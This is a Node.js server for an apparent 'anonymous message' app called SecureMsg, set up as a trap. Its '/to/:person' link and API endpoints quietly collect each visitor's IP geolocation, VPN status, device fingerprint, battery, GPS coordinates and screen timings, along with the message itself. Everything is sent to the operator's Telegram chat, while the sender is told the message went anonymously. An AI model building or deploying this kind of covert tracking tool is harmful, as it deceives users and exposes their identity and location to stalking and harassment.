require('dotenv').config();
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ── Global crash protection ────────────────────────────────
process.on('uncaughtException', (err) => {
  console.error('⚠️  Uncaught Exception:', err.message);
});
process.on('unhandledRejection', (err) => {
  console.error('⚠️  Unhandled Rejection:', err?.message || err);
});

// ── Middleware ──────────────────────────────────────────────
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// ── Helpers ────────────────────────────────────────────────
function getClientIP(req) {
  try {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) return forwarded.split(',')[0].trim();
    return req.headers['x-real-ip'] || req.socket?.remoteAddress || req.ip || '0.0.0.0';
  } catch {
    return '0.0.0.0';
  }
}

async function lookupIP(ip) {
  try {
    const cleanIP = (ip || '').replace('::ffff:', '');
    if (!cleanIP || cleanIP === '127.0.0.1' || cleanIP === '::1' || cleanIP.startsWith('192.168') || cleanIP.startsWith('10.')) {
      return {
        query: cleanIP || 'unknown', country: 'Local', countryCode: '--', city: 'Localhost',
        regionName: 'Local', isp: 'Local Network', proxy: false, hosting: false,
        org: 'N/A', as: 'N/A', timezone: 'N/A', zip: 'N/A',
      };
    }
    const { data } = await axios.get(
      `http://ip-api.com/json/${cleanIP}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,query`,
      { timeout: 5000 }
    );
    if (data && data.status === 'success') return data;
    return { query: cleanIP, country: 'Unknown', countryCode: '--', city: 'Unknown', regionName: '', isp: 'Unknown', proxy: false, hosting: false, org: 'N/A', as: 'N/A', timezone: 'N/A', zip: 'N/A' };
  } catch (err) {
    console.error('IP lookup error:', err.message);
    return { query: ip || 'error', country: 'Error', countryCode: '--', city: 'Error', regionName: '', isp: 'Error', proxy: false, hosting: false, org: 'N/A', as: 'N/A', timezone: 'N/A', zip: 'N/A' };
  }
}

async function sendTelegram(text) {
  if (!BOT_TOKEN || BOT_TOKEN === 'your_bot_token_here') {
    console.log('⏭️  Telegram skipped (no token configured)');
    return false;
  }
  try {
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: CHAT_ID,
      text,
      parse_mode: 'Markdown',
      disable_web_page_preview: true,
    }, { timeout: 10000 });
    console.log('✅ Telegram report sent');
    return true;
  } catch (err) {
    console.error('Telegram error:', err.response?.data?.description || err.message);
    try {
      await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id: CHAT_ID,
        text: text.replace(/[*_`\[\]]/g, ''),
        disable_web_page_preview: true,
      }, { timeout: 10000 });
      return true;
    } catch { return false; }
  }
}

function esc(str) {
  if (str === null || str === undefined) return 'N/A';
  return String(str).replace(/[_*`\[]/g, '');
}

// ── ROUTE: Trap Link ───────────────────────────────────────
app.get('/to/:person', (req, res) => {
  const person = req.params.person;
  const ip = getClientIP(req);
  const ua = req.headers['user-agent'] || 'Unknown';
  const referrer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
  const lang = req.headers['accept-language'] || 'Unknown';

  console.log(`\n📥 Trap link hit: /to/${person} from ${ip}`);

  // Send the HTML page first (synchronous - no await needed)
  res.sendFile(path.join(__dirname, 'public', 'index.html'), (err) => {
    if (err) console.error('sendFile error:', err.message);
  });

  // Phase 1 – Silent Recon (Type A: The Hook) — fire and forget
  setImmediate(async () => {
    try {
      const geo = await lookupIP(ip);
      const vpnFlag = geo.proxy ? '🔴 YES' : '🟢 No';
      const hostingFlag = geo.hosting ? '🔴 YES' : '🟢 No';

      const reportA = `🔔 *TYPE A — NEW VISITOR DETECTED*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 *Target Link:* /to/${esc(person)}
⏰ *Time:* ${new Date().toISOString()}

🌐 *NETWORK INTELLIGENCE*
• IP: \`${esc(geo.query)}\`
• ISP: ${esc(geo.isp)}
• Org: ${esc(geo.org)}
• AS: ${esc(geo.as)}
• City: ${esc(geo.city)}, ${esc(geo.regionName)}
• Country: ${esc(geo.country)} (${esc(geo.countryCode)})
• Timezone: ${esc(geo.timezone)}
• Zip: ${esc(geo.zip)}
• VPN/Proxy: ${vpnFlag}
• Hosting/DC: ${hostingFlag}

📱 *DEVICE PREVIEW*
• UA: ${esc(ua).substring(0, 200)}
• Language: ${esc(lang).substring(0, 100)}
• Referrer: ${esc(referrer)}`;

      await sendTelegram(reportA);
    } catch (err) {
      console.error('Type A error:', err.message);
    }
  });
});

// ── API: Type B — App Installed ────────────────────────────
app.post('/api/install', async (req, res) => {
  try {
    const { person, fingerprint } = req.body || {};
    if (!fingerprint) return res.status(400).json({ error: 'Missing data' });

    const fp = fingerprint;
    console.log(`\n🔧 Type B: Install report for /to/${person}`);

    const reportB = `🔧 *TYPE B — APP INSTALLED*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 *Target:* /to/${esc(person)}
⏰ *Time:* ${new Date().toISOString()}

🖥 *HARDWARE FORENSICS*
• GPU: ${esc(fp.gpu?.renderer)}
• GPU Vendor: ${esc(fp.gpu?.vendor)}
• CPU Cores: ${esc(fp.cpuCores)}
• RAM: ${esc(fp.deviceMemory)} GB
• Touch Points: ${esc(fp.maxTouchPoints)}

🔋 *BATTERY*
• Level: ${fp.battery?.level != null ? Math.round(fp.battery.level * 100) + '%' : 'N/A'}
• Charging: ${fp.battery?.charging != null ? (fp.battery.charging ? '⚡ Yes' : '🔌 No') : 'N/A'}

🌐 *BROWSER & OS*
• Browser: ${esc(fp.browser?.name)} ${esc(fp.browser?.version)}
• Engine: ${esc(fp.browser?.engine)}
• OS: ${esc(fp.os?.name)} ${esc(fp.os?.version)}
• Device Type: ${esc(fp.device?.type || 'Desktop')}
• Device: ${esc(fp.device?.vendor)} ${esc(fp.device?.model)}
• Platform: ${esc(fp.platform)}
• Language: ${esc(fp.language)}

🔐 *FINGERPRINTS*
• Visitor ID: \`${esc(fp.visitorId)}\`
• Canvas Hash: \`${esc(fp.canvasHash)}\`
• Incognito: ${fp.incognito ? '🔴 YES' : '🟢 No'}
• DNT: ${fp.dnt ? '🔴 Yes' : '🟢 No'}
• Cookies: ${fp.cookiesEnabled ? '🟢 Yes' : '🔴 No'}

📐 *SCREEN*
• Screen: ${esc(fp.screen?.width)}×${esc(fp.screen?.height)}
• Viewport: ${esc(fp.screen?.viewportWidth)}×${esc(fp.screen?.viewportHeight)}
• Color Depth: ${esc(fp.screen?.colorDepth)}
• Pixel Ratio: ${esc(fp.screen?.pixelRatio)}`;

    await sendTelegram(reportB);
    res.json({ success: true });
  } catch (err) {
    console.error('Type B error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ── API: Type C — Permissions Granted ──────────────────────
app.post('/api/permissions', async (req, res) => {
  try {
    const { person, location, notificationToken, timeOnPermScreen } = req.body || {};
    console.log(`\n📍 Type C: Permissions report for /to/${person}`);

    let locationBlock = '• Status: Not granted';
    if (location && location.latitude) {
      const mapsLink = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
      locationBlock = `• Latitude: \`${location.latitude}\`
• Longitude: \`${location.longitude}\`
• Accuracy: ${location.accuracy ? location.accuracy + 'm' : 'N/A'}
• Altitude: ${location.altitude || 'N/A'}
• Speed: ${location.speed || 'N/A'}
• 📍 [Open in Google Maps](${mapsLink})`;
    }

    const reportC = `📍 *TYPE C — PERMISSIONS GRANTED*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 *Target:* /to/${esc(person)}
⏰ *Time:* ${new Date().toISOString()}

🗺 *GEOLOCATION (High Accuracy)*
${locationBlock}

🔔 *NOTIFICATIONS*
• Token: ${notificationToken ? '✅ Granted' : '❌ Not granted'}

⏱ *BEHAVIORAL*
• Time on permission screen: ${timeOnPermScreen ? (timeOnPermScreen / 1000).toFixed(1) + 's' : 'N/A'}`;

    await sendTelegram(reportC);
    res.json({ success: true });
  } catch (err) {
    console.error('Type C error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ── API: Type D — Message Sent ─────────────────────────────
app.post('/api/send', async (req, res) => {
  try {
    const { person, message, fingerprint, behavioral } = req.body || {};
    if (!message || !message.trim()) return res.status(400).json({ error: 'Message is empty' });

    console.log(`\n💬 Type D: Message from /to/${person}`);

    const ip = getClientIP(req);
    const geo = await lookupIP(ip);
    const fp = fingerprint || {};
    const bh = behavioral || {};
    const vpnFlag = geo.proxy ? '🔴 YES' : '🟢 No';

    const reportD = `💬 *TYPE D — MESSAGE RECEIVED*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📌 *Target:* /to/${esc(person)}
⏰ *Time:* ${new Date().toISOString()}

💌 *MESSAGE*
\`\`\`
${esc(message).substring(0, 1000)}
\`\`\`

📊 *BEHAVIORAL ANALYTICS*
• Total time on page: ${bh.timeOnPage ? (bh.timeOnPage / 1000).toFixed(1) + 's' : 'N/A'}
• Time on install screen: ${bh.timeOnInstall ? (bh.timeOnInstall / 1000).toFixed(1) + 's' : 'N/A'}
• Time on permission screen: ${bh.timeOnPermissions ? (bh.timeOnPermissions / 1000).toFixed(1) + 's' : 'N/A'}
• Time on message screen: ${bh.timeOnMessage ? (bh.timeOnMessage / 1000).toFixed(1) + 's' : 'N/A'}

🌐 *NETWORK (Final Check)*
• IP: \`${esc(geo.query)}\`
• Location: ${esc(geo.city)}, ${esc(geo.country)}
• ISP: ${esc(geo.isp)}
• VPN: ${vpnFlag}

🖥 *HARDWARE SUMMARY*
• GPU: ${esc(fp.gpu?.renderer)}
• CPU: ${esc(fp.cpuCores)} cores
• RAM: ${esc(fp.deviceMemory)} GB
• Battery: ${fp.battery?.level != null ? Math.round(fp.battery.level * 100) + '%' : 'N/A'}
• OS: ${esc(fp.os?.name)} ${esc(fp.os?.version)}
• Browser: ${esc(fp.browser?.name)} ${esc(fp.browser?.version)}
• Incognito: ${fp.incognito ? '🔴 YES' : '🟢 No'}

🔑 *IDENTIFIERS*
• Visitor ID: \`${esc(fp.visitorId)}\`
• Canvas Hash: \`${esc(fp.canvasHash)}\``;

    await sendTelegram(reportD);
    res.json({ success: true, message: 'Message sent anonymously' });
  } catch (err) {
    console.error('Type D error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ── Catch-all root ─────────────────────────────────────────
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html><head><title>SecureMsg</title>
<style>body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#0a0a0f;color:#fff;font-family:system-ui;text-align:center}
h1{font-size:2rem;background:linear-gradient(135deg,#00f0ff,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
p{color:#888;margin-top:1rem}</style></head>
<body><div><h1>SecureMsg</h1><p>Share your link: /to/yourname</p></div></body></html>`);
});

// ── Express error handler ──────────────────────────────────
app.use((err, req, res, next) => {
  console.error('Express error:', err.message);
  res.status(500).json({ error: 'Internal server error' });
});

// ── Start Server ───────────────────────────────────────────
const server = app.listen(PORT, () => {
  console.log(`\n  ⚡ SecureMsg server running on http://localhost:${PORT}`);
  console.log(`  📎 Share links like: http://localhost:${PORT}/to/someone\n`);
  if (!BOT_TOKEN || BOT_TOKEN === 'your_bot_token_here') {
    console.warn('  ⚠️  TELEGRAM_BOT_TOKEN not set — reports will be skipped\n');
  }
});

server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`\n  ❌ Port ${PORT} is already in use. Kill the other process or change PORT in .env\n`);
  } else {
    console.error('Server error:', err.message);
  }
});
